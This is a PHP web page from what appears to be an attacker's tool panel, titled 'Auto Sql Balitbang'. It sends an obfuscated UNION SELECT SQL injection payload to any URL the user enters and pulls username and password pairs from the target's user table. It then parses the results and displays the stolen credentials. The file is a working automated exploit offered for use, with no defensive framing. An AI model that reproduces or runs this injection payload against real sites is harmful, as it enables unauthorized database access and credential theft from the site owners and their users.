<?php
$judul=@Auto_Sql_Balitbang;
include'sec.php';
error_reporting(0);
?>
<?php include 'helixdata/head.php'; 
?>
<body id="page-top">
<?php include 'helixdata/sidebar.php'; 
?>
<?php include 'helixdata/topcontent.php'; 
?>
 <!-- Begin Page Content -->
                <div class="container-fluid">
                    
<!-- Tools Card -->
                            <div class="card shadow mb-4">
                                <div class="card-header py-3">
                                    <center><h6 class="m-0 font-weight-bold text-primary"><?php echo str_replace("_", " ", "$judul"); ?></h6></center>
                                </div>
                                <br> <center>
<?php

$url = isset($_POST['target']) ? htmlspecialchars(htmlentities(addslashes($_POST['target']))) : '';
if (!empty($url)) {
	$query = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
	$ch = curl_init();
	curl_setopt_array($ch, [
		CURLOPT_URL => $url,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_POSTFIELDS => "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$query,version()-- -",
		CURLOPT_VERBOSE => 1
	]);
	$curl = curl_exec($ch);
	$preg = preg_match_all("'<result>(.*?)</result>'si", $curl, $isi);
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<title>Auto Balitbang</title>
</head>
<body>
<center>
    <font class="blink">Auto Sql Balitbang</font>
	    <div class="card-body">
		  <form method="post" class="was-validated">
			<input type="url" name="target" placeholder="https://target.com" class="form-control" required="required">
		</form>
		
		<?php
		if (isset($_POST["target"])) {
			if (!empty($isi[1])) {
				echo '<div class="mt-3"><hr>';
				$i = 1;
				foreach ($isi[1] as $key) {
					$result = "<li><i class='fa fa-user-circle'></i> Username : ".str_replace(":", "</li><li><i class='fa fa-key'></i> Password : ", $key)."</li>";
					if ($i != 1) echo "<hr>";
					echo "<i class='fa fa-pie-chart'></i> Data ".$i++;
					echo "<br>$result";
				}
				//echo '</ul>';
			} else {
				echo '<script>
swal("Gagal mengambil data", "", "error")
</script>';
			}
		}
		?>
		
	    </div>
	</div>
</div>
</center>
</body>
<script>

  var rev = "fwd";
  function titlebar(val)
  {
  var msg = "Balitbang Auto SQL-i Tools || AIM FOR THE IMPOSSIBLE";
  var res = " ";
  var speed = 30;
  var pos = val;   
  msg = " " +msg+" ";
  var le = msg.length;
  if(rev == "fwd"){
  if(pos < le){
  pos = pos+1;
  scroll = msg.substr(0,pos);
  document.title = scroll;
  timer = window.setTimeout("titlebar("+pos+")",speed);
  }
  else{
  rev = "bwd";
  timer = window.setTimeout("titlebar("+pos+")",speed);
  }
  }
  else{
  if(pos > 0){
  pos = pos-1;
  var ale = le-pos;
  scrol = msg.substr(ale,le);
  document.title = scrol;
  timer = window.setTimeout("titlebar("+pos+")",speed);
  }
  else{
  rev = "fwd";
  timer = window.setTimeout("titlebar("+pos+")",speed);
  } 
  }
  }       
  titlebar(0);

</script>
</html>